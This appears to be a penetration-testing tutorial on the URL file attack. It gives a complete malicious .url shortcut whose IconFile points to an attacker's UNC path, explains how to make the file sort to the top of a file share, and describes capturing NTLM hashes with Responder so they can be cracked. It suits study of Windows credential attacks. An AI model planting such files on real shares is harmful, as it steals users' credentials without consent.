## URL file
- A file with `.url` extension is a special file containing internet shortcuts that are used by web browsers.
- This file contains the information for a website’s URL address and may also contain the reference to the favicon file.
- When a user clicks on the URL file, the user’s browser launches the web page that the URL directs to.

## URL File Attack
- In organizations, most of the time, they have a common file share through which the employees can share the resources.
- URL File Attack captures the users’ hashes whoever accesses the File Share. This is done through a special file with `.url` extension.

### Working
The most important point in this attack is that the file must load in the list. Sometimes, there could be hundreds or thousands of files in a share. So, all files are not loaded at once. Instead, they load as the user scroll downs. We need a way so that our file always appears. For this, we can make it appear on top of the file listing.

We choose the filename in such a way that it appears on the top of the file share. For this, we can put a `@` (at symbol) or a `~` (squiggly symbol) at the start of the filename.

**Before describing the attack vector, it is important to know the contents of a URL file which are as below**
```python
[InternetShortcut] 
URL=blah 
WorkingDirectory=blah 
IconFile=\\192.168.1.19\%USERNAME%.icon 
IconIndex=1
```

### Explanation
- **[InternetShortcut]** is a header line that specifies the file type and indicates that the following lines are instructions for an internet shortcut
- **URL=anyurl** specifies the URL of the website or web page that the shortcut should launch. The actual URL should be provided in place of the “anyurl” placeholder
- **WorkingDirectory=anydir** specifies the default working directory for the shortcut. In most cases, this will be the directory in which the shortcut file is located. You can replace the “anydir” placeholder with the full path of the directory, if necessary
- **IconFile=\\192.168.1.19\%USERNAME%.icon** specifies the location of the icon file to use for the shortcut. The icon file can be stored on a remote computer, which is specified by the IP address “192.168.1.19”. The “%USERNAME%” placeholder is replaced with the current user’s username. The “.icon” extension specifies the type of file that contains the icon data
- **IconIndex=1** specifies which icon in the specified icon file should be used for the shortcut. In this case, the number “1” references to the first icon in the file for use. If the icon file contains multiple icons, choose the number accordingly to select a different icon

**So now as we know all parts of the file, we can now look into the attack vector. The attack vector is the following line**
```python
IconFile=\\192.168.1.19\%USERNAME%.icon 
```

- This is because, if the line is present in the file, the machine will request the icon file from x.x.x.x IP address
- The attacker can put their own IP address in place of x.x.x.x and run responder at their machine. So, whenever any user opens the file share, the request from user will contain the authentication hash.
- Attacker on the other hand will capture the hashes using responder and later crack them.

## Practical implementation 
1. Creation of the url file.
![[url_file_attack1.png]]

2. Setting up the url file in the shares.
![[url_file_attack2.png]]

3. Getting hashes when user clicks on this file.
![[url_file_attack3.png]]
